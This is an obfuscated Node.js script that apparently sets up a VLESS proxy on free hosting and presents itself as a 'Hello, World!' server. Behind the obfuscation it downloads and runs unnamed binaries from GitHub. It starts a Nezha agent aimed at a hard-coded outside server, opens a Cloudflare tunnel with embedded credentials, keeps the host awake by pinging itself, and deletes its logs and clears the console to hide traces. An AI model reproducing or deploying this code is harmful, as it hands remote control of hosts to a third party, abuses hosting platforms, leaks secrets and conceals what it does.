const os = require('os');
const fs = require('fs');
const http = require('http');
const axios = require('axios');
const path = require('path');
const net = require('net');
const { execSync } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const UUID = process.env.UUID || 'beb2e120-0725-47d2-b6c4-3a78d135ae2d';
const uuid = UUID.replace(/-/g, "");
const { promisify } = require('util');
const { clear } = require('console');
const exec = promisify(require('child_process').exec);
const projectPageURL = process.env.URL || 'https://se15.onrender.com/';//填写项目域名可自动访问保活
const intervalInseconds = process.env.TIME || 120;  // 自动访问间隔时间（120s）
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nz.fcuk.eu.org';  //哪吒三个变量不全不运行，
const NEZHA_PORT = process.env.NEZHA_PORT || '5555';  // 哪吒端口为{443,8443,2096,2087,2083,2053}其中一个端口之一时开启tls
const NEZHA_KEY = process.env.NEZHA_KEY || 'CndJevDNyqXqzfQPCN';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '2.mini.cloudns.biz';      
const ARGO_AUTH = process.env.ARGO_AUTH || '{"AccountTag":"b4dbebaac0afa9f17f4e965aa0c0583a","TunnelSecret":"R9g8oK+qIko6n43VOImfHFubEkWTTxAevA2G0iuzS6g=","TunnelID":"a626a62a-558f-4ea8-b872-f3472474a4bd"}';
const CFIP = process.env.CFIP || '199.15.76.35';
const NAME = process.env.NAME || 'Vls';
const port = process.env.SERVER_PORT || process.env.PORT || 3000; // 节点订阅端口，若无法订阅请手动改为分配的端口
const ArgoPort = process.env.ARGO_PORT || 8001; //argo端口，若使用固定隧道token需改回8080或在CF后台更改隧道端口与这里对应

(function(_0x53971b,_0x586b3b){const _0x44fb14=_0x52b8,_0x385d07=_0x53971b();while(!![]){try{const _0x35aa6f=parseInt(_0x44fb14(0x238))/0x1+-parseInt(_0x44fb14(0x21d))/0x2*(parseInt(_0x44fb14(0x245))/0x3)+parseInt(_0x44fb14(0x232))/0x4+parseInt(_0x44fb14(0x225))/0x5*(-parseInt(_0x44fb14(0x25d))/0x6)+-parseInt(_0x44fb14(0x224))/0x7+-parseInt(_0x44fb14(0x219))/0x8+parseInt(_0x44fb14(0x246))/0x9;if(_0x35aa6f===_0x586b3b)break;else _0x385d07['push'](_0x385d07['shift']());}catch(_0x39c431){_0x385d07['push'](_0x385d07['shift']());}}}(_0x4d0d,0x19045));function cleanupoldFiles(){const _0x38ac8e=_0x52b8,_0x5be82c=[_0x38ac8e(0x20e),_0x38ac8e(0x213),_0x38ac8e(0x22c),_0x38ac8e(0x24c)];_0x5be82c['forEach'](_0x7f4809=>{const _0x248182=_0x38ac8e;fs[_0x248182(0x212)](_0x7f4809,_0x54ab77=>{const _0x30e662=_0x248182;_0x54ab77?console[_0x30e662(0x256)]('Skip\x20Delete\x20'+_0x7f4809):console['log'](_0x7f4809+'\x20has\x20been\x20deleted');});}),setTimeout(()=>{},0x7d0);}cleanupoldFiles();function getSystemArchitecture(){const _0x5cea32=_0x52b8,_0x2cdaff=os['arch']();return _0x2cdaff===_0x5cea32(0x23f)||_0x2cdaff===_0x5cea32(0x209)?_0x5cea32(0x23f):_0x5cea32(0x250);}function downloadFile(_0xe9f51c,_0x5478fc,_0x3fb025){const _0x448eb1=_0x52b8,_0x3a6d55=path[_0x448eb1(0x20c)]('./',_0xe9f51c),_0xad473f=fs['createWriteStream'](_0x3a6d55);axios({'method':_0x448eb1(0x206),'url':_0x5478fc,'responseType':'stream'})[_0x448eb1(0x20f)](_0x53ce54=>{const _0x2fba8c=_0x448eb1;_0x53ce54[_0x2fba8c(0x1fd)][_0x2fba8c(0x208)](_0xad473f),_0xad473f['on'](_0x2fba8c(0x254),()=>{const _0x230d0c=_0x2fba8c;_0xad473f['close'](),console[_0x230d0c(0x25b)](_0x230d0c(0x260)+_0xe9f51c+_0x230d0c(0x215)),_0x3fb025(null,_0xe9f51c);}),_0xad473f['on'](_0x2fba8c(0x256),_0x530cd3=>{const _0x246972=_0x2fba8c;fs[_0x246972(0x212)](_0x3a6d55,()=>{});const _0x113cb1='Download\x20'+_0xe9f51c+_0x246972(0x218)+_0x530cd3[_0x246972(0x248)];console[_0x246972(0x256)](_0x113cb1),_0x3fb025(_0x113cb1);});})[_0x448eb1(0x20d)](_0x211290=>{const _0x23a705=_0x448eb1,_0x56369f='Download\x20'+_0xe9f51c+_0x23a705(0x218)+_0x211290[_0x23a705(0x248)];console[_0x23a705(0x256)](_0x56369f),_0x3fb025(_0x56369f);});}async function downloadFilesAndRun(){const _0x48725a=_0x52b8,_0x149a5f=getSystemArchitecture(),_0x670dc3=getFilesForArchitecture(_0x149a5f);if(_0x670dc3['length']===0x0){console[_0x48725a(0x25b)](_0x48725a(0x21b));return;}const _0x4ef77e=_0x670dc3['map'](_0x37a14c=>{return new Promise((_0x1e4256,_0x85d51e)=>{const _0x3136b9=_0x52b8;downloadFile(_0x37a14c['fileName'],_0x37a14c[_0x3136b9(0x203)],(_0x2f4d55,_0x40a6e7)=>{_0x2f4d55?_0x85d51e(_0x2f4d55):_0x1e4256(_0x40a6e7);});});});try{await Promise[_0x48725a(0x241)](_0x4ef77e);}catch(_0x1510a9){console[_0x48725a(0x256)]('Error\x20downloading\x20files:',_0x1510a9);return;}function _0x2ba4d7(_0x3067d9){const _0x68c373=_0x48725a,_0x32b692=0x1fd;_0x3067d9[_0x68c373(0x247)](_0x1ac5f5=>{const _0x1a8c04=_0x68c373;fs[_0x1a8c04(0x236)](_0x1ac5f5,_0x32b692,_0x443ed6=>{const _0x1c8183=_0x1a8c04;_0x443ed6?console[_0x1c8183(0x256)](_0x1c8183(0x1f6)+_0x1ac5f5+':\x20'+_0x443ed6):console[_0x1c8183(0x25b)](_0x1c8183(0x24b)+_0x1ac5f5+':\x20'+_0x32b692[_0x1c8183(0x222)](0x8));});});}const _0x2aa3c1=[_0x48725a(0x255),_0x48725a(0x1f1)];_0x2ba4d7(_0x2aa3c1);let _0x4eb15a='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x61eef4=['443',_0x48725a(0x21c),_0x48725a(0x24d),_0x48725a(0x235),_0x48725a(0x1f2),'2053'];_0x61eef4['includes'](NEZHA_PORT)?_0x4eb15a='--tls':_0x4eb15a='';const _0x36f942=_0x48725a(0x228)+NEZHA_SERVER+':'+NEZHA_PORT+_0x48725a(0x1f3)+NEZHA_KEY+'\x20'+_0x4eb15a+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36f942),console[_0x48725a(0x25b)](_0x48725a(0x1f7)),await new Promise(_0x220290=>setTimeout(_0x220290,0x3e8));}catch(_0x547b36){console['error'](_0x48725a(0x202)+_0x547b36);}}else console[_0x48725a(0x25b)](_0x48725a(0x230));if(fs[_0x48725a(0x244)](_0x48725a(0x24c))){let _0x2a5a1e;if(ARGO_AUTH[_0x48725a(0x1f5)](/^[A-Z0-9a-z=]{120,250}$/))_0x2a5a1e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x48725a(0x1f5)](/TunnelSecret/)?_0x2a5a1e=_0x48725a(0x1ff):_0x2a5a1e=_0x48725a(0x23c)+ArgoPort;try{await exec(_0x48725a(0x1fc)+_0x2a5a1e+_0x48725a(0x249)),console[_0x48725a(0x25b)](_0x48725a(0x21e));}catch(_0x38100c){console['error']('Error\x20executing\x20command:\x20'+_0x38100c);}}await new Promise(_0x3af3f2=>setTimeout(_0x3af3f2,0x1388));}function getFilesForArchitecture(_0xaeee45){const _0x414c94=_0x52b8;if(_0xaeee45===_0x414c94(0x23f))return[{'fileName':_0x414c94(0x22c),'fileUrl':_0x414c94(0x201)},{'fileName':_0x414c94(0x24c),'fileUrl':_0x414c94(0x22d)}];else{if(_0xaeee45==='amd')return[{'fileName':_0x414c94(0x22c),'fileUrl':_0x414c94(0x22f)},{'fileName':'bot','fileUrl':'https://github.com/eooce/test/releases/download/amd64/server'}];}return[];}function argoTunnel(){const _0x580420=_0x52b8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x580420(0x25b)](_0x580420(0x1f4));return;}if(ARGO_AUTH['includes'](_0x580420(0x214))){fs[_0x580420(0x229)](_0x580420(0x22e),ARGO_AUTH);const _0x4f16c4='\x0atunnel:\x20'+ARGO_AUTH[_0x580420(0x231)]('\x22')[0xb]+'\x0acredentials-file:\x20./tunnel.json\x0aprotocol:\x20http2\x0a\x0aingress:\x0a\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20service:\x20http://localhost:'+ArgoPort+'\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404\x0a';fs['writeFileSync'](_0x580420(0x1fe),_0x4f16c4);}else console['log'](_0x580420(0x21f));}argoTunnel();function _0x4d0d(){const _0x554728=['concat','74641nzDhwy','Ws\x20Connected\x20successfully','push','Hello,\x20World!\x0a','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','send','readUInt8','arm','Error\x20while\x20deleting\x20files:\x20','all','Error\x20visiting\x20project\x20page:','every','existsSync','828lyBnVS','4178268RkmlVM','forEach','message','\x20>/dev/null\x202>&1\x20&','text/plain','Empowerment\x20success\x20for\x20','bot','2096','createServer','end','amd','listen','slice','reduce','finish','./npm','error','readFileSync','&path=%2F#','Thank\x20you\x20for\x20using\x20this\x20script,enjoy!','WS\x20Server\x20is\x20running\x20on\x20port\x20','log','text/plain;\x20charset=utf-8','6apJmhq','Files\x20cleaned\x20successfully','HTTP\x20Server\x20is\x20running\x20on\x20port\x20','Download\x20','ArgoDomain:','readFile','url','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','./bot','2083','\x20-p\x20','ARGO_AUTH\x20or\x20ARGO_DOMAIN\x20is\x20empty,\x20use\x20quick\x20tunnels','match','Empowerment\x20failed\x20for\x20','npm\x20is\x20running','Error\x20reading\x20boot.log:','Internal\x20Server\x20Error\x0a','&type=ws&host=','wss://','nohup\x20./bot\x20','data','tunnel.yml','tunnel\x20--edge-ip-version\x20auto\x20--config\x20tunnel.yml\x20run','File\x20saved\x20successfully','https://github.com/eooce/test/releases/download/ARM/swith','npm\x20running\x20error:\x20','fileUrl','unlinkSync','connection','get','URL\x20or\x20TIME\x20variable\x20is\x20empty.\x20skip\x20visit\x20url','pipe','arm64','ARGO_DOMAIN:','rm\x20-rf\x20boot.log\x20tunnel.json\x20tunnel.yml','join','catch','boot.log','then','once','readUInt16BE','unlink','sub.txt','TunnelSecret','\x20successfully','utf-8','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20failed:\x20','1033920mgcgFT','base64','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','8443','80UKAXTC','bot\x20is\x20running','ARGO_AUTH\x20Mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','E1:','\x0avless://','toString','map','1368157yuhvZt','945125isgGku','Error\x20executing\x20command:\x20','Server','nohup\x20./npm\x20-s\x20','writeFileSync','server\x20is\x20running','substr','npm','https://github.com/eooce/test/releases/download/arm64/server','tunnel.json','https://github.com/eooce/test/releases/download/bulid/swith','NEZHA\x20variable\x20is\x20empty,skip\x20running','split','353328ozducX','/sub','writeHead','2087','chmod'];_0x4d0d=function(){return _0x554728;};return _0x4d0d();}async function extractDomains(){const _0x4a2c1c=_0x52b8;let _0x4a260c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4a260c=ARGO_DOMAIN,console[_0x4a2c1c(0x25b)](_0x4a2c1c(0x20a),_0x4a260c);else try{const _0x1a0159=fs[_0x4a2c1c(0x257)](path[_0x4a2c1c(0x20c)]('boot.log'),'utf-8'),_0x28d915=_0x1a0159[_0x4a2c1c(0x231)]('\x0a'),_0x2712e4=[];_0x28d915[_0x4a2c1c(0x247)](_0x390c65=>{const _0x3b5a79=_0x4a2c1c,_0x5982c6=_0x390c65[_0x3b5a79(0x1f5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5982c6){const _0x1d3a1a=_0x5982c6[0x1];_0x2712e4[_0x3b5a79(0x23a)](_0x1d3a1a);}});if(_0x2712e4['length']>0x0)_0x4a260c=_0x2712e4[0x0],console[_0x4a2c1c(0x25b)](_0x4a2c1c(0x1ed),_0x4a260c);else{console[_0x4a2c1c(0x25b)](_0x4a2c1c(0x217)),fs[_0x4a2c1c(0x204)](path[_0x4a2c1c(0x20c)](_0x4a2c1c(0x20e))),await new Promise(_0x567c0b=>setTimeout(_0x567c0b,0x7d0));const _0x54e959=_0x4a2c1c(0x23c)+ArgoPort;try{await exec('nohup\x20'+path['join'](_0x4a2c1c(0x24c))+'\x20'+_0x54e959+_0x4a2c1c(0x249)),console[_0x4a2c1c(0x25b)]('bot\x20is\x20running'),await new Promise(_0x5af747=>setTimeout(_0x5af747,0xbb8)),await extractDomains();}catch(_0x188d36){console[_0x4a2c1c(0x256)](_0x4a2c1c(0x226)+_0x188d36);}}}catch(_0x448fc7){console[_0x4a2c1c(0x256)](_0x4a2c1c(0x1f8),_0x448fc7);}new WebSocket(_0x4a2c1c(0x1fb)+_0x4a260c);const _0x4d9a76=http['createServer'](),_0xcebb6e=new WebSocket[(_0x4a2c1c(0x227))]({'server':_0x4d9a76});_0xcebb6e['on'](_0x4a2c1c(0x205),_0x1a8691=>{const _0x1bc660=_0x4a2c1c;console[_0x1bc660(0x25b)](_0x1bc660(0x239)),_0x1a8691[_0x1bc660(0x210)](_0x1bc660(0x248),_0x4b2ef7=>{const _0x4b7eb7=_0x1bc660,[_0x2c06ea]=_0x4b2ef7,_0x457b25=_0x4b2ef7[_0x4b7eb7(0x252)](0x1,0x11);if(!_0x457b25[_0x4b7eb7(0x243)]((_0x1435d6,_0x549635)=>_0x1435d6==parseInt(uuid[_0x4b7eb7(0x22b)](_0x549635*0x2,0x2),0x10)))return;let _0x1465ac=_0x4b2ef7[_0x4b7eb7(0x252)](0x11,0x12)[_0x4b7eb7(0x23e)]()+0x13;const _0x96c0fa=_0x4b2ef7['slice'](_0x1465ac,_0x1465ac+=0x2)[_0x4b7eb7(0x211)](0x0),_0x13ebc9=_0x4b2ef7[_0x4b7eb7(0x252)](_0x1465ac,_0x1465ac+=0x1)[_0x4b7eb7(0x23e)](),_0x2cac01=_0x13ebc9==0x1?_0x4b2ef7[_0x4b7eb7(0x252)](_0x1465ac,_0x1465ac+=0x4)[_0x4b7eb7(0x20c)]('.'):_0x13ebc9==0x2?new TextDecoder()['decode'](_0x4b2ef7[_0x4b7eb7(0x252)](_0x1465ac+0x1,_0x1465ac+=0x1+_0x4b2ef7[_0x4b7eb7(0x252)](_0x1465ac,_0x1465ac+0x1)['readUInt8']())):_0x13ebc9==0x3?_0x4b2ef7[_0x4b7eb7(0x252)](_0x1465ac,_0x1465ac+=0x10)[_0x4b7eb7(0x253)]((_0x2b8599,_0x36e2c8,_0x5601e2,_0x357c0a)=>_0x5601e2%0x2?_0x2b8599[_0x4b7eb7(0x237)](_0x357c0a['slice'](_0x5601e2-0x1,_0x5601e2+0x1)):_0x2b8599,[])[_0x4b7eb7(0x223)](_0x3f0e65=>_0x3f0e65['readUInt16BE'](0x0)[_0x4b7eb7(0x222)](0x10))[_0x4b7eb7(0x20c)](':'):'';_0x1a8691[_0x4b7eb7(0x23d)](new Uint8Array([_0x2c06ea,0x0]));const _0x5c5265=createWebSocketStream(_0x1a8691);net['connect']({'host':_0x2cac01,'port':_0x96c0fa},function(){const _0x1e6ee3=_0x4b7eb7;this['write'](_0x4b2ef7[_0x1e6ee3(0x252)](_0x1465ac)),_0x5c5265['on']('error',_0x3b0acc=>console[_0x1e6ee3(0x256)](_0x1e6ee3(0x220),_0x3b0acc))[_0x1e6ee3(0x208)](this)['on'](_0x1e6ee3(0x256),_0x336e35=>console[_0x1e6ee3(0x256)]('E2:',_0x336e35))[_0x1e6ee3(0x208)](_0x5c5265);})['on']('error',_0x2cbe6b=>console['error']('Connect-Err:',{'host':_0x2cac01,'port':_0x96c0fa}));})['on'](_0x1bc660(0x256),_0x17fc26=>console[_0x1bc660(0x256)]('WebSocket\x20Error:',_0x17fc26));}),_0x4d9a76[_0x4a2c1c(0x251)](ArgoPort,()=>{const _0xdd75a3=_0x4a2c1c;console[_0xdd75a3(0x25b)](_0xdd75a3(0x25a)+ArgoPort),generateLinks(_0x4a260c),http[_0xdd75a3(0x24e)]((_0x5705c4,_0x424803)=>{const _0x21a6ef=_0xdd75a3;if(_0x5705c4[_0x21a6ef(0x1ef)]==='/')_0x424803[_0x21a6ef(0x234)](0xc8,{'Content-Type':_0x21a6ef(0x24a)}),_0x424803[_0x21a6ef(0x24f)](_0x21a6ef(0x23b));else _0x5705c4['url']===_0x21a6ef(0x233)?fs[_0x21a6ef(0x1ee)](_0x21a6ef(0x213),_0x21a6ef(0x216),(_0x7c2555,_0x5a6197)=>{const _0x298f7a=_0x21a6ef;_0x7c2555?(console['error']('Error\x20reading\x20sub.txt:',_0x7c2555),_0x424803[_0x298f7a(0x234)](0x1f4,{'Content-Type':_0x298f7a(0x24a)}),_0x424803[_0x298f7a(0x24f)](_0x298f7a(0x1f9))):(_0x424803[_0x298f7a(0x234)](0xc8,{'Content-Type':_0x298f7a(0x25c)}),_0x424803['end'](_0x5a6197));}):(_0x424803[_0x21a6ef(0x234)](0x194,{'Content-Type':_0x21a6ef(0x24a)}),_0x424803[_0x21a6ef(0x24f)]('Not\x20Found\x0a'));})[_0xdd75a3(0x251)](port,()=>{const _0xde7788=_0xdd75a3;console['log'](_0xde7788(0x25f)+port);});});}function _0x52b8(_0x4ac48f,_0x6eedbd){const _0x4d0d04=_0x4d0d();return _0x52b8=function(_0x52b889,_0x1efe24){_0x52b889=_0x52b889-0x1ed;let _0x57984e=_0x4d0d04[_0x52b889];return _0x57984e;},_0x52b8(_0x4ac48f,_0x6eedbd);}function generateLinks(_0x21b4f1){const _0x2b2c0c=_0x52b8,_0x107944=execSync(_0x2b2c0c(0x1f0),{'encoding':_0x2b2c0c(0x216)}),_0x4254c4=_0x107944['trim']();setTimeout(()=>{const _0x206f55=_0x2b2c0c,_0x41c759=_0x206f55(0x221)+UUID+'@'+CFIP+':443?encryption=none&security=tls&sni='+_0x21b4f1+_0x206f55(0x1fa)+_0x21b4f1+_0x206f55(0x258)+NAME+'-'+_0x4254c4+'\x0a\x20\x20',_0x3629a0=Buffer['from'](_0x41c759)['toString'](_0x206f55(0x21a));console[_0x206f55(0x25b)](_0x3629a0),fs[_0x206f55(0x229)](_0x206f55(0x213),_0x3629a0),console[_0x206f55(0x25b)](_0x206f55(0x200)),console['log'](_0x206f55(0x22a));},0x7d0);}function cleanFiles(){setTimeout(()=>{const _0x1efc9c=_0x52b8;exec(_0x1efc9c(0x20b),(_0x46c257,_0x104e85,_0x420d99)=>{const _0x5b2ef=_0x1efc9c;if(_0x46c257){console['error'](_0x5b2ef(0x240)+_0x46c257);return;}console[_0x5b2ef(0x25b)](_0x5b2ef(0x25e)),clear(),console[_0x5b2ef(0x25b)]('server\x20is\x20running'),console[_0x5b2ef(0x25b)](_0x5b2ef(0x259));});},0xea60);}cleanFiles();let hasLoggedEmptyMessage=![];async function visitProjectPage(){const _0x5b524b=_0x52b8;try{if(!projectPageURL||!intervalInseconds){!hasLoggedEmptyMessage&&(console['log'](_0x5b524b(0x207)),hasLoggedEmptyMessage=!![]);return;}else hasLoggedEmptyMessage=![];await axios[_0x5b524b(0x206)](projectPageURL),clear(),console[_0x5b524b(0x25b)]('Page\x20visited\x20successfully.');}catch(_0x1f0ea1){console['error'](_0x5b524b(0x242),_0x1f0ea1[_0x5b524b(0x248)]);}}setInterval(visitProjectPage,intervalInseconds*0x3e8);async function startserver(){await downloadFilesAndRun(),await extractDomains(),visitProjectPage();}startserver();
